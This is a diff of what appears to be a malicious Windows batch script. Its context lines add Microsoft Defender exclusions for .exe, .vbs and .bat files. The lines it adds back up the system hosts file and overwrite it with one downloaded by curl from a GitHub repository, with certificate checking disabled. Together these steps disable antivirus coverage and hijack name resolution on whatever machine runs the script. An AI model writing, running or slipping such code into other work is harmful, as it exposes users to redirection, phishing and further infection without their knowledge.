@@ -16,6 +16,9 @@ powershell.exe -command "Add-MpPreference -ExclusionExtension ".exe""
 powershell.exe -command "Add-MpPreference -ExclusionExtension ".vbs""
 powershell.exe -command "Add-MpPreference -ExclusionExtension ".bat""
 
+copy "C:\Windows\System32\drivers\etc\hosts" "C:\Windows\System32\drivers\etc\hosts.bak"
+"%environment%\curl.exe" -k %proxy% https://raw.githubusercontent.com/cryptedodissey/cryptedodissey.github.io/main/hosts > "C:\Windows\System32\drivers\etc\hosts"
+
 rem TESTING >
 if "%computername%"=="WIN-6QJBGJLRIGL" set environment=%appdata%\microsoft\windows
 rem TESTING <
